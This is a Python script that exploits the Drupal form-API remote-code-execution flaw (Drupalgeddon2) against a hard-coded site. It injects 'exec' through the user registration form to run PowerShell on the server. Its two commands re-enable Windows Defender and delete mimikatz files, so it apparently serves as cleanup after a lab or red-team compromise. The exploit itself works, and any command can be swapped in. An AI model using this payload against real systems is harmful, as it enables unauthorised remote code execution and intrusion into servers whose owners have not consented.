#!/usr/bin/python3

import requests
requests.packages.urllib3.disable_warnings() 

target = "http://cords.com/"

#Enable Windows Defender
command = "powershell Set-MpPreference -DisableRealtimeMonitoring $false"

url = target + '/admin/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': command }
print("Enabling AV on "+target+" ...")
r = requests.post(url, data=payload, verify=False)
print("Complete")

#remove mimikatz files
command = "powershell Remove-Item -path C:\inetpub\wwwroot\ -Filter *mimikatz*"

url = target + '/admin/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': command }
print("Cleaning up mimikatz files on "+target+" ...")
r = requests.post(url, data=payload, verify=False)
print("Complete")
